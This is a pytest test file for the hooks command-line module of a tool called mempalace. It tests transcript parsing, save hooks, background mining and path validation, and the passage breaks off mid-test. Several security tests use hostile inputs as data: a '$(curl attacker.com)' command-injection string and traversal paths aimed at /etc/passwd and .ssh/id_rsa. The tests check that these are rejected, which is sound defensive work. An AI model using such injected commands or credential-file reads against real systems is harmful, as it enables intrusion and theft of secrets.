import contextlib
import io
import json
import os
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

import mempalace.hooks_cli as hooks_cli_mod
from mempalace.hooks_cli import (
    SAVE_INTERVAL,
    _count_human_messages,
    _extract_recent_messages,
    _get_mine_targets,
    _log,
    _maybe_auto_ingest,
    _mempalace_python,
    _mine_already_running,
    _mine_sync,
    _parse_harness_input,
    _sanitize_session_id,
    _validate_transcript_path,
    _wing_from_transcript_path,
    hook_stop,
    hook_session_start,
    hook_precompact,
    run_hook,
)


# --- _mempalace_python ---


def test_mempalace_python_returns_string():
    result = _mempalace_python()
    assert isinstance(result, str)
    assert "python" in result


def test_mempalace_python_finds_venv():
    """Should resolve to a valid Python interpreter path."""
    result = _mempalace_python()
    assert result and "python" in os.path.basename(result).lower()


# --- _sanitize_session_id ---


def test_sanitize_normal_id():
    assert _sanitize_session_id("abc-123_XYZ") == "abc-123_XYZ"


def test_sanitize_strips_dangerous_chars():
    assert _sanitize_session_id("../../etc/passwd") == "etcpasswd"


def test_sanitize_empty_returns_unknown():
    assert _sanitize_session_id("") == "unknown"
    assert _sanitize_session_id("!!!") == "unknown"


# --- _count_human_messages ---


def _write_transcript(path: Path, entries: list[dict]):
    with open(path, "w", encoding="utf-8") as f:
        for entry in entries:
            f.write(json.dumps(entry) + "\n")


def test_count_human_messages_basic(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {"message": {"role": "user", "content": "hello"}},
            {"message": {"role": "assistant", "content": "hi"}},
            {"message": {"role": "user", "content": "bye"}},
        ],
    )
    assert _count_human_messages(str(transcript)) == 2


def test_count_skips_command_messages(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {"message": {"role": "user", "content": "<command-message>status</command-message>"}},
            {"message": {"role": "user", "content": "real question"}},
        ],
    )
    assert _count_human_messages(str(transcript)) == 1


def test_count_handles_list_content(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {"message": {"role": "user", "content": [{"type": "text", "text": "hello"}]}},
            {
                "message": {
                    "role": "user",
                    "content": [{"type": "text", "text": "<command-message>x</command-message>"}],
                }
            },
        ],
    )
    assert _count_human_messages(str(transcript)) == 1


def test_count_missing_file():
    assert _count_human_messages("/nonexistent/path.jsonl") == 0


def test_count_empty_file(tmp_path):
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("")
    assert _count_human_messages(str(transcript)) == 0


def test_count_malformed_json_lines(tmp_path):
    transcript = tmp_path / "t.jsonl"
    transcript.write_text('not json\n{"message": {"role": "user", "content": "ok"}}\n')
    assert _count_human_messages(str(transcript)) == 1


# --- _extract_recent_messages ---


def test_extract_recent_messages_basic(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(5)],
    )
    msgs = _extract_recent_messages(str(transcript), count=3)
    assert len(msgs) == 3
    assert msgs[0] == "msg 2"
    assert msgs[2] == "msg 4"


def test_extract_recent_messages_skips_commands(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [
            {"message": {"role": "user", "content": "real msg"}},
            {"message": {"role": "user", "content": "<command-message>status</command-message>"}},
            {"message": {"role": "user", "content": "<system-reminder>hook</system-reminder>"}},
        ],
    )
    msgs = _extract_recent_messages(str(transcript))
    assert len(msgs) == 1
    assert msgs[0] == "real msg"


def test_extract_recent_messages_missing_file():
    assert _extract_recent_messages("/nonexistent.jsonl") == []


# --- hook_stop ---


def _capture_hook_output(hook_fn, data, harness="claude-code", state_dir=None):
    """Run a hook and capture its JSON stdout output."""
    import io
    from unittest.mock import PropertyMock

    buf = io.StringIO()
    patches = [patch("mempalace.hooks_cli._output", side_effect=lambda d: buf.write(json.dumps(d)))]
    if state_dir:
        patches.append(patch("mempalace.hooks_cli.STATE_DIR", state_dir))
    # Mock MempalaceConfig so tests don't depend on user's ~/.mempalace/config.json
    mock_config = MagicMock()
    type(mock_config).hook_silent_save = PropertyMock(return_value=True)
    type(mock_config).hook_desktop_toast = PropertyMock(return_value=False)
    patches.append(patch("mempalace.config.MempalaceConfig", return_value=mock_config))
    with contextlib.ExitStack() as stack:
        for p in patches:
            stack.enter_context(p)
        hook_fn(data, harness)
    return json.loads(buf.getvalue())


def test_stop_hook_passthrough_when_active(tmp_path):
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        result = _capture_hook_output(
            hook_stop,
            {"session_id": "test", "stop_hook_active": True, "transcript_path": ""},
            state_dir=tmp_path,
        )
    assert result == {}


def test_stop_hook_passthrough_when_active_string(tmp_path):
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        result = _capture_hook_output(
            hook_stop,
            {"session_id": "test", "stop_hook_active": "true", "transcript_path": ""},
            state_dir=tmp_path,
        )
    assert result == {}


def test_stop_hook_passthrough_below_interval(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL - 1)],
    )
    result = _capture_hook_output(
        hook_stop,
        {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
        state_dir=tmp_path,
    )
    assert result == {}


def test_stop_hook_saves_silently_at_interval(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    save_result = {"count": 15, "themes": ["hooks", "notifications"]}
    with patch("mempalace.hooks_cli._save_diary_direct", return_value=save_result) as mock_save:
        result = _capture_hook_output(
            hook_stop,
            {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
            state_dir=tmp_path,
        )
    # Saves silently — systemMessage notification with themes, no block
    assert result["systemMessage"].startswith("\u2726 15 memories woven into the palace")
    assert "hooks" in result["systemMessage"]
    # tmp_path has no "-Projects-" segment, so _wing_from_transcript_path falls back to "wing_sessions"
    mock_save.assert_called_once_with(str(transcript), "test", wing="wing_sessions", toast=False)


def test_stop_hook_derives_wing_from_transcript_path(tmp_path):
    """When transcript path looks like a Claude Code path, wing is derived from it."""
    project_dir = tmp_path / ".claude" / "projects" / "-home-jp-Projects-myproject"
    project_dir.mkdir(parents=True)
    transcript = project_dir / "session.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    save_result = {"count": 15, "themes": []}
    with patch("mempalace.hooks_cli._save_diary_direct", return_value=save_result) as mock_save:
        _capture_hook_output(
            hook_stop,
            {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
            state_dir=tmp_path,
        )
    mock_save.assert_called_once_with(str(transcript), "test", wing="wing_myproject", toast=False)


def test_stop_hook_tracks_save_point(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    data = {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)}

    # First call saves silently with systemMessage notification
    save_result = {"count": 15, "themes": ["hooks"]}
    with patch("mempalace.hooks_cli._save_diary_direct", return_value=save_result):
        result = _capture_hook_output(hook_stop, data, state_dir=tmp_path)
    assert "systemMessage" in result

    # Second call with same count passes through (already saved)
    with patch("mempalace.hooks_cli._save_diary_direct") as mock_save:
        result = _capture_hook_output(hook_stop, data, state_dir=tmp_path)
    assert result == {}
    mock_save.assert_not_called()


# --- hook_session_start ---


def test_session_start_passes_through(tmp_path):
    result = _capture_hook_output(
        hook_session_start,
        {"session_id": "test"},
        state_dir=tmp_path,
    )
    assert result == {}


# --- hook_precompact ---


def test_precompact_allows(tmp_path):
    result = _capture_hook_output(
        hook_precompact,
        {"session_id": "test"},
        state_dir=tmp_path,
    )
    assert result == {}


# --- _wing_from_transcript_path ---


def test_wing_from_transcript_path_extracts_project():
    path = "/home/jp/.claude/projects/-home-jp-Projects-memorypalace/session.jsonl"
    assert _wing_from_transcript_path(path) == "wing_memorypalace"


def test_wing_from_transcript_path_fallback():
    assert _wing_from_transcript_path("/some/random/path.jsonl") == "wing_sessions"


def test_wing_from_transcript_path_windows_backslashes():
    path = "C:\\Users\\jp\\.claude\\projects\\-home-jp-Projects-myapp\\session.jsonl"
    assert _wing_from_transcript_path(path) == "wing_myapp"


def test_wing_from_transcript_path_lowercases():
    path = "/home/jp/.claude/projects/-home-jp-Projects-MyProject/session.jsonl"
    assert _wing_from_transcript_path(path) == "wing_myproject"


def test_wing_from_transcript_path_non_projects_layout():
    # Linux users with code under ~/dev/, ~/src/, ~/code/ — no -Projects- segment.
    # Project name is the final dash-separated token of the encoded folder.
    path = "/home/igor/.claude/projects/-home-igor-dev-MemPalace-mempalace/session.jsonl"
    assert _wing_from_transcript_path(path) == "wing_mempalace"


def test_wing_from_transcript_path_macos_users_layout():
    # macOS ~/ layout without a Projects/ segment.
    path = "/Users/alice/.claude/projects/-Users-alice-code-MyApp/session.jsonl"
    assert _wing_from_transcript_path(path) == "wing_myapp"


def test_wing_from_transcript_path_nested_deep():
    path = "/home/bob/.claude/projects/-home-bob-work-clients-acme-frontend/session.jsonl"
    assert _wing_from_transcript_path(path) == "wing_frontend"


# --- _log ---


def test_output_writes_to_real_stdout_fd_when_mcp_server_loaded():
    """_output() must reach fd 1 even when mcp_server has redirected sys.stdout."""
    import types

    fake_module = types.ModuleType("mempalace.mcp_server")

    read_fd, write_fd = os.pipe()
    try:
        fake_module._REAL_STDOUT_FD = write_fd
        with patch.dict("sys.modules", {"mempalace.mcp_server": fake_module}):
            from mempalace.hooks_cli import _output

            _output({"systemMessage": "test"})

        os.close(write_fd)
        written = b""
        while True:
            chunk = os.read(read_fd, 4096)
            if not chunk:
                break
            written += chunk
    finally:
        os.close(read_fd)

    data = json.loads(written.decode())
    assert data["systemMessage"] == "test"


def test_output_falls_back_to_fd1_when_mcp_server_absent():
    """_output() writes to fd 1 directly when mcp_server is not loaded."""
    read_fd, write_fd = os.pipe()
    try:
        orig_fd1 = os.dup(1)
        os.dup2(write_fd, 1)
        os.close(write_fd)
        try:
            modules_without_mcp = {
                k: v for k, v in __import__("sys").modules.items() if "mcp_server" not in k
            }
            with patch.dict("sys.modules", modules_without_mcp, clear=True):
                from mempalace.hooks_cli import _output

                _output({"continue": True})
        finally:
            os.dup2(orig_fd1, 1)
            os.close(orig_fd1)
    except Exception:
        os.close(read_fd)
        raise

    written = b""
    while True:
        chunk = os.read(read_fd, 4096)
        if not chunk:
            break
        written += chunk
    os.close(read_fd)

    data = json.loads(written.decode())
    assert data["continue"] is True


def test_log_writes_to_hook_log(tmp_path):
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        _log("test message")
    log_path = tmp_path / "hook.log"
    assert log_path.is_file()
    content = log_path.read_text()
    assert "test message" in content


def test_log_oserror_is_silenced(tmp_path):
    """_log should not raise if the directory cannot be created."""
    with patch("mempalace.hooks_cli.STATE_DIR", Path("/nonexistent/deeply/nested/dir")):
        # Should not raise
        _log("this will fail silently")


# --- _maybe_auto_ingest ---


def test_maybe_auto_ingest_no_env(tmp_path):
    """Without MEMPAL_DIR or transcript_path, does nothing."""
    with patch.dict("os.environ", {}, clear=True):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            _maybe_auto_ingest()  # should not raise


def test_maybe_auto_ingest_with_env(tmp_path):
    """With MEMPAL_DIR set, spawns mine in projects mode against that dir."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._MINE_PID_FILE", tmp_path / "mine.pid"):
                with patch("mempalace.hooks_cli.subprocess.Popen") as mock_popen:
                    _maybe_auto_ingest()
                    mock_popen.assert_called_once()
                    cmd = mock_popen.call_args[0][0]
                    assert "mine" in cmd
                    assert str(mempal_dir.resolve()) in cmd
                    assert cmd[cmd.index("--mode") + 1] == "projects"


def test_maybe_auto_ingest_uses_mempalace_python(tmp_path):
    """Spawned mine command uses _mempalace_python(), not bare sys.executable.

    Hook subprocesses inherit the harness PATH which on GUI-launched
    Claude Code may resolve to a system Python without chromadb. The
    interpreter used here must be the same one the hook itself runs
    under (typically the venv that owns mempalace).
    """
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._MINE_PID_FILE", tmp_path / "mine.pid"):
                with patch(
                    "mempalace.hooks_cli._mempalace_python", return_value="/fake/venv/python"
                ):
                    with patch("mempalace.hooks_cli.subprocess.Popen") as mock_popen:
                        _maybe_auto_ingest()
                        cmd = mock_popen.call_args[0][0]
                        assert cmd[0] == "/fake/venv/python"


def test_mine_sync_with_env_uses_projects_mode(tmp_path):
    """Precompact sync path uses projects mode when MEMPAL_DIR is set."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli.subprocess.run") as mock_run:
                _mine_sync()
                mock_run.assert_called_once()
                cmd = mock_run.call_args[0][0]
                assert cmd[cmd.index("--mode") + 1] == "projects"


def test_mine_sync_uses_mempalace_python(tmp_path):
    """Sync mine command uses _mempalace_python(), not bare sys.executable."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._mempalace_python", return_value="/fake/venv/python"):
                with patch("mempalace.hooks_cli.subprocess.run") as mock_run:
                    _mine_sync()
                    cmd = mock_run.call_args[0][0]
                    assert cmd[0] == "/fake/venv/python"


def test_maybe_auto_ingest_ignores_transcript_arg_path(tmp_path):
    """_maybe_auto_ingest does NOT mine the transcript directory.

    Transcript convos are handled by _ingest_transcript (called separately
    in hook handlers). _maybe_auto_ingest only handles MEMPAL_DIR — even
    when invoked in a context where a transcript is also being processed,
    no second spawn for the transcript dir should appear here.
    """
    convo_dir = tmp_path / "convos"
    convo_dir.mkdir()
    transcript = convo_dir / "session.jsonl"
    transcript.write_text("")
    with patch.dict("os.environ", {}, clear=True):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._MINE_PID_FILE", tmp_path / "mine.pid"):
                with patch("mempalace.hooks_cli.subprocess.Popen") as mock_popen:
                    _maybe_auto_ingest()
                    mock_popen.assert_not_called()


def test_mine_sync_ignores_transcript(tmp_path):
    """_mine_sync does not run a convos mine for the transcript dir.

    The precompact transcript ingest is the responsibility of
    _ingest_transcript; routing it through _mine_sync would stack a
    second 60s timeout against the harness 30s ceiling.
    """
    convo_dir = tmp_path / "convos"
    convo_dir.mkdir()
    transcript = convo_dir / "session.jsonl"
    transcript.write_text("")
    with patch.dict("os.environ", {}, clear=True):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli.subprocess.run") as mock_run:
                _mine_sync()
                mock_run.assert_not_called()


def test_maybe_auto_ingest_oserror(tmp_path):
    """OSError during subprocess spawn is silenced."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._MINE_PID_FILE", tmp_path / "mine.pid"):
                with patch("mempalace.hooks_cli.subprocess.Popen", side_effect=OSError("fail")):
                    _maybe_auto_ingest()  # should not raise


def test_maybe_auto_ingest_skips_when_mine_running(tmp_path):
    """Does not spawn a new mine process if one is already running."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._mine_already_running", return_value=True):
                with patch("mempalace.hooks_cli.subprocess.Popen") as mock_popen:
                    _maybe_auto_ingest()
                    mock_popen.assert_not_called()


# --- _mine_already_running ---


def test_mine_already_running_no_file(tmp_path):
    """Returns False when no PID file exists."""
    with patch("mempalace.hooks_cli._MINE_PID_FILE", tmp_path / "mine.pid"):
        assert _mine_already_running() is False


def test_mine_already_running_dead_pid(tmp_path):
    """Returns False when PID file contains a PID that no longer exists."""
    pid_file = tmp_path / "mine.pid"
    pid_file.write_text("999999999")  # almost certainly not a real PID
    with patch("mempalace.hooks_cli._MINE_PID_FILE", pid_file):
        assert _mine_already_running() is False


def test_mine_already_running_live_pid(tmp_path):
    """Returns True when PID file contains the current process's own PID."""
    pid_file = tmp_path / "mine.pid"
    pid_file.write_text(str(os.getpid()))  # current process is definitely alive
    with patch("mempalace.hooks_cli._MINE_PID_FILE", pid_file):
        assert _mine_already_running() is True


def test_mine_already_running_corrupt_file(tmp_path):
    """Returns False when PID file contains non-integer content."""
    pid_file = tmp_path / "mine.pid"
    pid_file.write_text("not-a-pid")
    with patch("mempalace.hooks_cli._MINE_PID_FILE", pid_file):
        assert _mine_already_running() is False


# --- _get_mine_targets ---


def test_get_mine_targets_mempal_dir_only(tmp_path):
    """MEMPAL_DIR alone yields a single projects target, expanded/resolved."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        targets = _get_mine_targets()
    assert len(targets) == 1
    assert Path(targets[0][0]).resolve() == mempal_dir.resolve()
    assert targets[0][1] == "projects"


def test_get_mine_targets_mempal_dir_tilde(tmp_path):
    """MEMPAL_DIR with a tilde prefix is expanded correctly."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    home = Path.home()
    try:
        rel = mempal_dir.relative_to(home)
    except ValueError:
        pytest.skip("tmp_path is not under home, cannot build ~-relative path")
    tilde_path = "~/" + str(rel)
    with patch.dict("os.environ", {"MEMPAL_DIR": tilde_path}):
        targets = _get_mine_targets()
    assert len(targets) == 1
    assert Path(targets[0][0]).resolve() == mempal_dir.resolve()
    assert targets[0][1] == "projects"


def test_get_mine_targets_no_transcript_target(tmp_path):
    """_get_mine_targets does not emit a convos target for the transcript path.

    Transcript ingestion is owned by _ingest_transcript; emitting it
    here too would double-mine the same JSONL into a different wing on
    every hook fire (#1231 review).
    """
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("")
    with patch.dict("os.environ", {}, clear=True):
        targets = _get_mine_targets()
    assert targets == []


def test_get_mine_targets_only_returns_mempal_dir(tmp_path):
    """When MEMPAL_DIR is set, exactly one projects target — never a convos target."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        targets = _get_mine_targets()
    assert len(targets) == 1
    assert targets[0][1] == "projects"


def test_validate_transcript_path_traversal_rejected_jsonl(tmp_path):
    """Path traversal is rejected even when the path has a .jsonl suffix.

    The pre-fix test used "../../etc/passwd" which lacks an extension and
    so was rejected by the suffix gate before the traversal check ever
    fired (Copilot review on #1231). Use a .jsonl path with `..`
    segments to exercise the traversal guard specifically.
    """
    assert _validate_transcript_path("../t.jsonl") is None
    assert _validate_transcript_path("a/../b.jsonl") is None
    assert _validate_transcript_path("/tmp/../etc/t.jsonl") is None


def test_get_mine_targets_empty():
    """Returns empty list when MEMPAL_DIR is unset or invalid."""
    with patch.dict("os.environ", {}, clear=True):
        assert _get_mine_targets() == []


# --- _parse_harness_input ---


def test_parse_harness_input_unknown():
    """Unknown harness should sys.exit(1)."""
    with pytest.raises(SystemExit) as exc_info:
        _parse_harness_input({"session_id": "test"}, "unknown-harness")
    assert exc_info.value.code == 1


def test_parse_harness_input_valid():
    result = _parse_harness_input(
        {"session_id": "abc-123", "stop_hook_active": True, "transcript_path": "/tmp/t.jsonl"},
        "claude-code",
    )
    assert result["session_id"] == "abc-123"
    assert result["stop_hook_active"] is True


# --- hook_stop with OSError on write ---


def test_stop_hook_oserror_on_last_save_read(tmp_path):
    """When last_save_file has invalid content, falls back to 0."""
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    # Write invalid content to last save file
    (tmp_path / "test_last_save").write_text("not_a_number")
    save_result = {"count": 15, "themes": ["testing"]}
    with patch("mempalace.hooks_cli._save_diary_direct", return_value=save_result):
        result = _capture_hook_output(
            hook_stop,
            {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
            state_dir=tmp_path,
        )
    assert "systemMessage" in result
    assert "15 memories" in result["systemMessage"]


def test_stop_hook_oserror_on_write(tmp_path):
    """When write to last_save_file fails, hook still outputs correctly."""
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )

    def bad_write_text(*args, **kwargs):
        raise OSError("disk full")

    save_result = {"count": 15, "themes": []}
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        with patch("mempalace.hooks_cli._save_diary_direct", return_value=save_result):
            with patch.object(Path, "write_text", bad_write_text):
                result = _capture_hook_output(
                    hook_stop,
                    {
                        "session_id": "test",
                        "stop_hook_active": False,
                        "transcript_path": str(transcript),
                    },
                    state_dir=tmp_path,
                )
    assert "systemMessage" in result


# --- hook_precompact with MEMPAL_DIR ---


def test_precompact_with_mempal_dir(tmp_path):
    """Precompact runs subprocess.run (sync) when MEMPAL_DIR is set."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch("mempalace.hooks_cli.subprocess.run") as mock_run:
            result = _capture_hook_output(
                hook_precompact,
                {"session_id": "test"},
                state_dir=tmp_path,
            )
    assert result == {}
    mock_run.assert_called_once()


def test_precompact_with_mempal_dir_oserror(tmp_path):
    """Precompact handles OSError from subprocess gracefully."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch("mempalace.hooks_cli.subprocess.run", side_effect=OSError("fail")):
            result = _capture_hook_output(
                hook_precompact,
                {"session_id": "test"},
                state_dir=tmp_path,
            )
    assert result == {}


def test_precompact_with_timeout(tmp_path):
    """Precompact handles TimeoutExpired gracefully -- still allows."""
    mempal_dir = tmp_path / "project"
    mempal_dir.mkdir()
    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
        with patch(
            "mempalace.hooks_cli.subprocess.run",
            side_effect=subprocess.TimeoutExpired(cmd="mine", timeout=60),
        ):
            result = _capture_hook_output(
                hook_precompact, {"session_id": "test"}, state_dir=tmp_path
            )
    assert result == {}


def test_precompact_mines_transcript_dir(tmp_path, monkeypatch):
    """Precompact ingests the active transcript via _ingest_transcript.

    With no MEMPAL_DIR, _mine_sync is a no-op; the transcript ingest is
    the only mining that should fire, and it goes through Popen
    (background) inside _ingest_transcript. Pre-#1231-review this test
    asserted against subprocess.run, which corresponded to the
    duplicate-mine path that has now been removed.
    """
    transcript = tmp_path / "t.jsonl"
    # _ingest_transcript skips files smaller than 100 bytes, so pad it.
    transcript.write_text("x" * 200)
    monkeypatch.delenv("MEMPAL_DIR", raising=False)
    with patch("mempalace.hooks_cli.subprocess.Popen") as mock_popen:
        with patch("mempalace.hooks_cli.subprocess.run") as mock_run:
            result = _capture_hook_output(
                hook_precompact,
                {"session_id": "test", "transcript_path": str(transcript)},
                state_dir=tmp_path,
            )
    assert result == {}
    mock_run.assert_not_called()
    mock_popen.assert_called_once()
    cmd = mock_popen.call_args[0][0]
    # Mines the transcript's parent dir as convos, into wing "sessions".
    assert str(tmp_path) in cmd
    assert cmd[cmd.index("--mode") + 1] == "convos"
    assert cmd[cmd.index("--wing") + 1] == "sessions"


# --- run_hook ---


def test_run_hook_dispatches_session_start(tmp_path):
    """run_hook reads stdin JSON and dispatches to correct handler."""
    stdin_data = json.dumps({"session_id": "run-test"})
    with patch("sys.stdin", io.StringIO(stdin_data)):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._output") as mock_output:
                run_hook("session-start", "claude-code")
    mock_output.assert_called_once_with({})


def test_run_hook_dispatches_stop(tmp_path):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript, [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(3)]
    )
    stdin_data = json.dumps(
        {
            "session_id": "run-test",
            "stop_hook_active": False,
            "transcript_path": str(transcript),
        }
    )
    with patch("sys.stdin", io.StringIO(stdin_data)):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._output") as mock_output:
                run_hook("stop", "claude-code")
    mock_output.assert_called_once_with({})


def test_run_hook_dispatches_precompact(tmp_path):
    stdin_data = json.dumps({"session_id": "run-test"})
    with patch("sys.stdin", io.StringIO(stdin_data)):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._output") as mock_output:
                run_hook("precompact", "claude-code")
    mock_output.assert_called_once_with({})


def test_run_hook_unknown_hook():
    stdin_data = json.dumps({"session_id": "test"})
    with patch("sys.stdin", io.StringIO(stdin_data)):
        with pytest.raises(SystemExit) as exc_info:
            run_hook("nonexistent", "claude-code")
        assert exc_info.value.code == 1


def test_run_hook_invalid_json(tmp_path):
    """Invalid stdin JSON should not crash — falls back to empty dict."""
    with patch("sys.stdin", io.StringIO("not valid json")):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.hooks_cli._output") as mock_output:
                run_hook("session-start", "claude-code")
    mock_output.assert_called_once_with({})


# --- Security: transcript_path validation ---


def test_validate_transcript_rejects_path_traversal():
    """Paths with '..' components should be rejected."""
    assert _validate_transcript_path("../../etc/passwd") is None
    assert _validate_transcript_path("../../../.ssh/id_rsa") is None


def test_validate_transcript_rejects_wrong_extension():
    """Only .jsonl and .json extensions are accepted."""
    assert _validate_transcript_path("/tmp/transcript.txt") is None
    assert _validate_transcript_path("/tmp/secret.py") is None
    assert _validate_transcript_path("/home/user/.ssh/id_rsa") is None


def test_validate_transcript_accepts_valid_paths(tmp_path):
    """Valid .jsonl and .json paths should be accepted."""
    jsonl_path = tmp_path / "session.jsonl"
    jsonl_path.touch()
    result = _validate_transcript_path(str(jsonl_path))
    assert result is not None
    assert result.suffix == ".jsonl"

    json_path = tmp_path / "session.json"
    json_path.touch()
    result = _validate_transcript_path(str(json_path))
    assert result is not None
    assert result.suffix == ".json"


def test_validate_transcript_empty_string():
    """Empty transcript path should return None."""
    assert _validate_transcript_path("") is None


def test_count_rejects_traversal_path():
    """_count_human_messages should return 0 for path traversal attempts."""
    assert _count_human_messages("../../etc/passwd") == 0


def test_count_logs_warning_on_rejected_path(tmp_path):
    """_count_human_messages should log a warning when a non-empty path is rejected."""
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        with patch("mempalace.hooks_cli._log") as mock_log:
            _count_human_messages("../../etc/passwd")
    mock_log.assert_called_once()
    assert "rejected" in mock_log.call_args[0][0].lower()


def test_validate_transcript_accepts_platform_native_path(tmp_path):
    """Validator accepts platform-native paths (backslashes on Windows, slashes on Unix)."""
    session_file = tmp_path / "projects" / "abc123" / "session.jsonl"
    session_file.parent.mkdir(parents=True)
    session_file.touch()
    # Use the OS-native string representation (backslashes on Windows)
    result = _validate_transcript_path(str(session_file))
    assert result is not None
    assert result.suffix == ".jsonl"
    assert result.is_file()


def test_stop_hook_rejects_injected_stop_hook_active(tmp_path):
    """stop_hook_active with shell injection string should not cause pass-through.

    Verifies the injected value is not treated as truthy — the save path runs
    instead of being short-circuited. Mocks _save_diary_direct so we can assert
    it was invoked regardless of silent vs legacy save mode.
    """
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    with patch(
        "mempalace.hooks_cli._save_diary_direct", return_value={"count": 1, "themes": []}
    ) as mock_save:
        _capture_hook_output(
            hook_stop,
            {
                "session_id": "test",
                "stop_hook_active": "$(curl attacker.com)",
                "transcript_path": str(transcript),
            },
            state_dir=tmp_path,
        )
    # The injected value is not "true"/"1"/"yes", so the hook should NOT pass through.
    # Save must have been attempted.
    assert mock_save.called


# --- Absent palace root: hooks must not recreate ~/.mempalace ---
#
# When the user removes ~/.mempalace (e.g. `rm -rf`), that is the strongest
# possible "do not auto-capture" signal. Hooks must short-circuit BEFORE
# touching disk — including before the log-line that previously triggered
# STATE_DIR.mkdir() on its own.


def _redirect_palace_root(monkeypatch, tmp_path):
    """Point PALACE_ROOT and STATE_DIR at a tmp location that does NOT exist."""
    fake_root = tmp_path / "absent-mempalace"
    monkeypatch.setattr(hooks_cli_mod, "PALACE_ROOT", fake_root)
    monkeypatch.setattr(hooks_cli_mod, "STATE_DIR", fake_root / "hook_state")
    monkeypatch.setattr(hooks_cli_mod, "_state_dir_initialized", False)
    return fake_root


def test_hook_stop_does_not_create_palace_dir_when_absent(tmp_path, monkeypatch):
    fake_root = _redirect_palace_root(monkeypatch, tmp_path)
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("")
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        hook_stop(
            {"session_id": "absent", "transcript_path": str(transcript), "stop_hook_active": False},
            "claude-code",
